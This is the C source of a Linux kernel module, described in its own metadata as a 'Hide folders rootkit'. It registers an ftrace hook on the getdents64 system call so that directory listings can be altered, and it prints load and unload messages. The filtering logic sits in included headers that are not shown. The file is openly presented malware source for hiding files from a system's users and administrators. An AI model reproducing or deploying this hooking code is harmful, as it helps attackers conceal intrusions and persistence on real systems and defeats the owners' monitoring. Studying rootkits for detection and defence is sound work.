#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_config.h"
#include "dkom_config.h"

MODULE_DESCRIPTION("Hide folders rootkit");
MODULE_AUTHOR("Fotis <fotparaskevop@gmail.com>");
MODULE_LICENSE("MIT");
MODULE_VERSION("1.0");


///////////////////////////////
//   Define Hook Struct
///////////////////////////////
#define HOOK(_name, _function, _original)	\
	{					\
		.name = (_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}



///////////////////////////////
//   Hooking getdents 
///////////////////////////////
static struct ftrace_hook hooks[] = {
  HOOK("__x64_sys_getdents64",  fh_getdents,  &orig_getdents),
};


///////////////////////////////
//    Rootkit init
///////////////////////////////
static int __init rootkit_init(void)
{
    printk(KERN_INFO "ABOUT TO LOAD THE ROOTKIT\n");
    printk(KERN_INFO "-------------------------------\n");
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
      return err;

    printk(KERN_INFO "Rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
